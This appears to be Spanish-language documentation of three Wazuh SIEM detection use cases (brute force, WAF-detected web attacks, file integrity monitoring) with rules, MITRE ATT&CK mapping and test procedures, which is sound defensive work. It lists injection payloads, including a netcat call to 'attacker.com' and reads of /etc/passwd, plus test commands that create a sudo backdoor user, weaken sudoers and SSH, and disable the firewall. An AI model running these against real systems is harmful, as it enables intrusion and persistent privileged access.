# Casos de Uso - Documentación Detallada

## Resumen

Se implementan 3 casos de uso personalizados para Fósil Energías Renovables, mapeados contra MITRE ATT&CK y con alertas configuradas en Wazuh.

---

## Caso de Uso 1: Detección de Brute Force

### Descripción
Detectar múltiples intentos fallidos de autenticación que puedan indicar un ataque de fuerza bruta contra servicios SSH, Keycloak o Kong.

### Escenario de Amenaza
Un atacante intenta adivinar credenciales mediante intentos automatizados de login desde Internet o desde una máquina comprometida en la red interna.

### Reglas Wazuh

**Regla Base (100001)**
```xml
<rule id="100001" level="10" frequency="5" timeframe="300">
  <if_matched_sid>5503,5551</if_matched_sid>
  <description>Múltiples intentos de autenticación fallidos detectados</description>
  <mitre>
    <id>T1110</id>
  </mitre>
  <group>authentication_failures,gdpr_IV_35.7.d,hipaa_164.312.b</group>
</rule>
```

**Regla Agravada - IP Externa (100002)**
```xml
<rule id="100002" level="12">
  <if_sid>100001</if_sid>
  <srcip>!10.0.1.0/24</srcip>
  <description>Múltiples intentos fallidos desde IP externa sospechosa (fuera de VPC)</description>
  <mitre>
    <id>T1110</id>
  </mitre>
  <group>authentication_failures,attacks,</group>
</rule>
```

**Regla Agravada - Usuario Privilegiado (100003)**
```xml
<rule id="100003" level="12">
  <if_sid>100001</if_sid>
  <user>root|admin|administrator|ubuntu</user>
  <description>Múltiples intentos fallidos en cuenta privilegiada</description>
  <mitre>
    <id>T1110</id>
  </mitre>
  <group>authentication_failures,privilege_escalation,</group>
</rule>
```

### Fuentes de Datos

| Servicio | Log Path | Formato |
|----------|----------|---------|
| SSH | `/var/log/auth.log` | syslog |
| Keycloak | `/opt/keycloak/data/log/keycloak.log` | multi-line |
| Kong | `/var/log/kong/access.log` | JSON |

### Parámetros de Detección

- **Threshold**: 5 intentos fallidos
- **Timeframe**: 5 minutos (300 segundos)
- **Nivel Base**: 10 (alerta)
- **Nivel Agravado**: 12 (crítico)

### Respuesta Automática
```xml
<command>
  <name>firewall-drop</name>
  <executable>firewall-drop.sh</executable>
  <expect>srcip</expect>
</command>

<active-response>
  <command>firewall-drop</command>
  <location>local</location>
  <rules_id>100002,100003</rules_id>
  <timeout>600</timeout>
</active-response>
```

**Acción**: Bloquear IP atacante por 10 minutos usando UFW.

### Testing

**Simular ataque SSH:**
```bash
# Desde tu máquina local
for i in {1..6}; do
  ssh -o ConnectTimeout=2 usuario_falso@<wazuh-ip>
done
```

**Resultado esperado:**
1. 5 intentos → Alerta nivel 10 (ID 100001)
2. IP externa → Alerta nivel 12 (ID 100002)
3. UFW bloquea la IP por 10 minutos
4. Dashboard Wazuh muestra alerta con detalles

---

## Caso de Uso 2: Ataques Web via WAF

### Descripción
Detectar intentos de explotación de vulnerabilidades web comunes (OWASP Top 10) mediante análisis de logs de ModSecurity integrado con Kong.

### Escenario de Amenaza
Un atacante intenta explotar vulnerabilidades web como SQL Injection, XSS o RCE contra las APIs y aplicaciones protegidas por Kong Gateway.

### Reglas Wazuh

**Regla Base - ModSecurity (100010)**
```xml
<rule id="100010" level="7">
  <decoded_as>modsecurity</decoded_as>
  <match>ModSecurity: Warning</match>
  <description>ModSecurity detectó actividad sospechosa</description>
  <mitre>
    <id>T1190</id>
  </mitre>
  <group>web,attack,owasp,</group>
</rule>
```

**SQL Injection (100011)**
```xml
<rule id="100011" level="10">
  <if_sid>100010</if_sid>
  <match>SQL Injection Attack</match>
  <description>Intento de SQL Injection bloqueado por WAF</description>
  <mitre>
    <id>T1190</id>
  </mitre>
  <group>web,attack,owasp,sqli,</group>
</rule>
```

**XSS (100012)**
```xml
<rule id="100012" level="10">
  <if_sid>100010</if_sid>
  <match>XSS Attack|Cross-site Scripting</match>
  <description>Intento de XSS bloqueado por WAF</description>
  <mitre>
    <id>T1059</id>
  </mitre>
  <group>web,attack,owasp,xss,</group>
</rule>
```

**RCE (100013)**
```xml
<rule id="100013" level="12">
  <if_sid>100010</if_sid>
  <match>Remote Command Execution|Remote Code Execution</match>
  <description>Intento de RCE bloqueado por WAF</description>
  <mitre>
    <id>T1059</id>
  </mitre>
  <group>web,attack,owasp,rce,</group>
</rule>
```

**Múltiples Ataques (100014)**
```xml
<rule id="100014" level="12" frequency="10" timeframe="120">
  <if_matched_sid>100010</if_matched_sid>
  <description>Múltiples ataques web desde la misma IP</description>
  <mitre>
    <id>T1190</id>
  </mitre>
  <group>web,attack,owasp,multiple_attacks,</group>
</rule>
```

### Fuentes de Datos

| Servicio | Log Path | Formato |
|----------|----------|---------|
| ModSecurity | `/var/log/modsec_audit.log` | Audit |
| Kong Access | `/var/log/kong/access.log` | JSON |
| Kong Error | `/var/log/kong/error.log` | JSON |

### Tipos de Ataques Detectados

1. **SQL Injection**
   - `' OR '1'='1`
   - `UNION SELECT`
   - `DROP TABLE`

2. **XSS (Cross-Site Scripting)**
   - `<script>alert('xss')</script>`
   - `<img src=x onerror=alert(1)>`
   - `javascript:alert(1)`

3. **RCE (Remote Code Execution)**
   - `; ls -la`
   - `| cat /etc/passwd`
   - `$(whoami)`

4. **Path Traversal**
   - `../../etc/passwd`
   - `....//....//etc/passwd`

5. **Command Injection**
   - `; ping -c 10 127.0.0.1`
   - `| nc attacker.com 4444`

### Testing

**SQL Injection:**
```bash
curl "http://<waf-ip>:8000/api/users?id=1' OR '1'='1"
```

**XSS:**
```bash
curl "http://<waf-ip>:8000/api/search?q=<script>alert('xss')</script>"
```

**RCE:**
```bash
curl "http://<waf-ip>:8000/api/exec?cmd=; ls -la"
```

**Path Traversal:**
```bash
curl "http://<waf-ip>:8000/api/file?path=../../etc/passwd"
```

### Respuesta Automática
```xml
<active-response>
  <command>firewall-drop</command>
  <location>local</location>
  <rules_id>100013,100014</rules_id>
  <timeout>1800</timeout>
</active-response>
```

**Acción**: Bloquear IP atacante por 30 minutos en ataques críticos (RCE, múltiples).

### Evidencia para Documentación

- Screenshot de cada tipo de ataque bloqueado
- Logs de ModSecurity con detalles
- Dashboard Wazuh mostrando correlación
- Comparación antes/después del WAF

---

## Caso de Uso 3: Cambios No Autorizados (FIM)

### Descripción
Monitorear en tiempo real cambios en archivos críticos del sistema que puedan indicar compromiso, escalada de privilegios o mala configuración.

### Escenario de Amenaza
Un atacante con acceso inicial al sistema intenta:
- Crear backdoor usuarios
- Modificar configuración SSH
- Alterar reglas de firewall
- Cambiar configuración sudo para escalada de privilegios

### Configuración FIM

**Archivo**: `/var/ossec/etc/ossec.conf` (en cada agente)
```xml
<syscheck>
  <frequency>300</frequency>
  <realtime>yes</realtime>
  <alert_new_files>yes</alert_new_files>
  
  <!-- Archivos de usuarios y grupos -->
  <directories check_all="yes" realtime="yes" report_changes="yes">/etc/passwd</directories>
  <directories check_all="yes" realtime="yes" report_changes="yes">/etc/shadow</directories>
  <directories check_all="yes" realtime="yes" report_changes="yes">/etc/group</directories>
  <directories check_all="yes" realtime="yes" report_changes="yes">/etc/gshadow</directories>
  
  <!-- Sudo configuration -->
  <directories check_all="yes" realtime="yes" report_changes="yes">/etc/sudoers</directories>
  <directories check_all="yes" realtime="yes" report_changes="yes">/etc/sudoers.d</directories>
  
  <!-- SSH configuration -->
  <directories check_all="yes" realtime="yes" report_changes="yes">/etc/ssh/sshd_config</directories>
  <directories check_all="yes" realtime="yes" report_changes="yes">/root/.ssh</directories>
  <directories check_all="yes" realtime="yes" report_changes="yes">/home/*/.ssh</directories>
  
  <!-- Firewall rules -->
  <directories check_all="yes" realtime="yes" report_changes="yes">/etc/ufw</directories>
  <directories check_all="yes" realtime="yes" report_changes="yes">/etc/iptables</directories>
  
  <!-- System boot and services -->
  <directories check_all="yes" realtime="yes">/etc/systemd/system</directories>
  <directories check_all="yes" realtime="yes">/etc/cron.d</directories>
  <directories check_all="yes" realtime="yes">/etc/crontab</directories>
  
  <!-- APLICACIONES CRÍTICAS -->
  <directories check_all="yes" realtime="yes" report_changes="yes">/var/ossec/etc</directories>
  <directories check_all="yes" realtime="yes" report_changes="yes">/etc/kong</directories>
  <directories check_all="yes" realtime="yes" report_changes="yes">/opt/keycloak/conf</directories>
  
  <!-- EXCLUSIONES -->
  <ignore>/etc/mtab</ignore>
  <ignore type="sregex">^/var/log/</ignore>
  <ignore type="sregex">^/tmp/</ignore>
  <ignore type="sregex">\.log$</ignore>
  <ignore type="sregex">\.swp$</ignore>
</syscheck>
```

### Reglas Wazuh

**Cambios en usuarios (100020)**
```xml
<rule id="100020" level="10">
  <if_sid>550</if_sid>
  <match>/etc/passwd|/etc/shadow|/etc/group|/etc/gshadow</match>
  <description>Cambio detectado en archivo de usuarios del sistema</description>
  <mitre>
    <id>T1098</id>
  </mitre>
  <group>syscheck,account_changed,gdpr_IV_35.7.d,</group>
</rule>
```

**Cambios en sudoers (100021)**
```xml
<rule id="100021" level="12">
  <if_sid>550</if_sid>
  <match>/etc/sudoers</match>
  <description>Cambio crítico detectado en configuración de sudo</description>
  <mitre>
    <id>T1548.003</id>
  </mitre>
  <group>syscheck,privilege_escalation,</group>
</rule>
```

**Cambios en SSH (100022)**
```xml
<rule id="100022" level="10">
  <if_sid>550</if_sid>
  <match>/etc/ssh/sshd_config|authorized_keys</match>
  <description>Cambio detectado en configuración SSH</description>
  <mitre>
    <id>T1098.004</id>
  </mitre>
  <group>syscheck,ssh,</group>
</rule>
```

**Cambios en firewall (100023)**
```xml
<rule id="100023" level="10">
  <if_sid>550</if_sid>
  <match>/etc/ufw|/etc/iptables|iptables.rules</match>
  <description>Cambio detectado en configuración de firewall</description>
  <mitre>
    <id>T1562.004</id>
  </mitre>
  <group>syscheck,firewall,</group>
</rule>
```

**Cambios en aplicaciones (100024)**
```xml
<rule id="100024" level="8">
  <if_sid>550</if_sid>
  <match>/var/ossec/etc|/etc/wazuh|/opt/keycloak|/etc/kong</match>
  <description>Cambio detectado en configuración de aplicación crítica</description>
  <group>syscheck,application,</group>
</rule>
```

### Archivos Monitoreados

| Archivo/Directorio | Criticidad | Realtime | Report Changes |
|-------------------|------------|----------|----------------|
| `/etc/passwd` | Alta | ✅ | ✅ |
| `/etc/shadow` | Crítica | ✅ | ✅ |
| `/etc/sudoers` | Crítica | ✅ | ✅ |
| `/etc/ssh/sshd_config` | Alta | ✅ | ✅ |
| `/root/.ssh` | Alta | ✅ | ✅ |
| `/etc/ufw` | Alta | ✅ | ✅ |
| `/etc/systemd/system` | Media | ✅ | ❌ |
| `/etc/cron.d` | Media | ✅ | ❌ |
| `/var/ossec/etc` | Alta | ✅ | ✅ |

### Testing

**Test 1: Crear usuario backdoor**
```bash
# En VM4 (Hardening)
sudo useradd -m -s /bin/bash backdoor
sudo usermod -aG sudo backdoor
```

**Resultado esperado:**
- Alerta ID 100020 (nivel 10)
- Dashboard muestra cambio en `/etc/passwd`
- Diff completo del cambio
- Usuario reportado: backdoor

**Test 2: Modificar SSH**
```bash
# Permitir root login (inseguro)
sudo sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config
```

**Resultado esperado:**
- Alerta ID 100022 (nivel 10)
- Dashboard muestra cambio en `/etc/ssh/sshd_config`
- Diff: `PermitRootLogin no` → `PermitRootLogin yes`

**Test 3: Modificar sudoers**
```bash
# Agregar usuario sin password
echo "backdoor ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers
```

**Resultado esperado:**
- Alerta ID 100021 (nivel 12, crítico)
- Dashboard muestra cambio en `/etc/sudoers`
- Línea agregada visible en diff

**Test 4: Desactivar firewall**
```bash
sudo ufw disable
```

**Resultado esperado:**
- Alerta ID 100023 (nivel 10)
- Dashboard muestra cambio en configuración UFW

### Report Changes (Diff)

Wazuh muestra el diff exacto:
```diff
--- /etc/ssh/sshd_config (before)
+++ /etc/ssh/sshd_config (after)
@@ -32,7 +32,7 @@
 # Authentication:
 
 LoginGraceTime 60
-PermitRootLogin no
+PermitRootLogin yes
 StrictModes yes
```

### Respuesta Manual

1. **Revisar cambio**: Dashboard → FIM → Ver diff
2. **Verificar legitimidad**: ¿Fue cambio autorizado?
3. **Si no autorizado**:
   - Revertir cambio
   - Investigar cómo ocurrió
   - Cambiar passwords si necesario
   - Revisar logs de acceso

### Alertas por Email
```xml
<email_alerts>
  <email_to>admin@fosil.uy</email_to>
  <level>12</level>
  <do_not_delay />
  <group>syscheck,</group>
</email_alerts>
```

**Envía email inmediato para cambios críticos (nivel 12+)**

### Evidencia para Documentación

- Screenshot de cada tipo de cambio detectado
- Diff completo mostrado en dashboard
- Timeline de eventos
- Correlación con otros eventos (ej: login antes del cambio)

---

## Mapeo MITRE ATT&CK

| Caso de Uso | Táctica | Técnica | ID |
|-------------|---------|---------|-----|
| Brute Force | Credential Access | Brute Force | T1110 |
| Ataques Web | Initial Access | Exploit Public-Facing Application | T1190 |
| Cambios Usuario | Persistence | Account Manipulation | T1098 |
| Cambios Sudo | Privilege Escalation | Sudo and Sudo Caching | T1548.003 |
| Cambios SSH | Persistence | SSH Authorized Keys | T1098.004 |
| Cambios Firewall | Defense Evasion | Impair Defenses | T1562.004 |

---

## Dashboard Personalizado

### Widgets Recomendados

1. **Top Alerts by Rule ID**
   - Filtrar: 100001-100024
   - Visualización: Bar chart

2. **Authentication Failures Over Time**
   - Filtrar: group authentication_failures
   - Visualización: Line chart

3. **WAF Blocks by Attack Type**
   - Filtrar: group web,attack
   - Visualización: Pie chart

4. **FIM Changes by File**
   - Filtrar: group syscheck
   - Visualización: Table

5. **Top Attacking IPs**
   - Filtrar: level >= 10
   - Visualización: Data table

6. **MITRE ATT&CK Coverage**
   - Visualización: Heatmap
   - Técnicas detectadas

---

## Métricas de Éxito

### Caso 1: Brute Force
- ✅ Detección en < 5 minutos
- ✅ Bloqueo automático de IP
- ✅ Alerta visible en dashboard
- ✅ Email enviado para nivel 12

### Caso 2: Ataques Web
- ✅ Detección en tiempo real
- ✅ Tipos de ataque identificados
- ✅ IP atacante registrada
- ✅ Bloqueo tras múltiples intentos

### Caso 3: FIM
- ✅ Detección en < 1 minuto (realtime)
- ✅ Diff completo disponible
- ✅ Archivo exacto identificado
- ✅ Usuario que hizo cambio registrado

---
